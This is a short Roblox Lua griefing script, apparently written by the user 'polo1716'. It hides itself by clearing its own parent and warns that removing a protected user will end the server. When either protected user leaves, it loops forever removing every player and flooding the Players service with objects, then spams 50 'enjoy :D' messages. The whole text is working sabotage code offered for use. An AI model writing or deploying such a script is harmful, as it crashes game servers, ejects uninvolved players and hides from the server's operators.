script.Parent = nil
protect = {"polo1716","ic3w0lf589"}
hn = Instance.new("Hint")
hn.Parent = game:GetService("Workspace")
hn.Text = "Removing ic3w0lf589 will end the server"
function servend()
while true do 
wait()
for i,v in pairs(game:GetService("Players"):GetChildren()) do 
v:remove()
m = Instance.new("Model")
m.Parent = game:GetService("Players")
end 
end 
end 
function onleave(scan)
for i = 1,#protect do 
if scan.Name == protect[i] then
servend()
for i = 1,50 do 
ms = Instance.new("Message")
ms.Parent = game:GetService("Workspace")
ms.Text = "enjoy :D"
end 
end 
end
end 
game:GetService("Players").ChildRemoved:connect(onleave) 

--==[polo1716]==--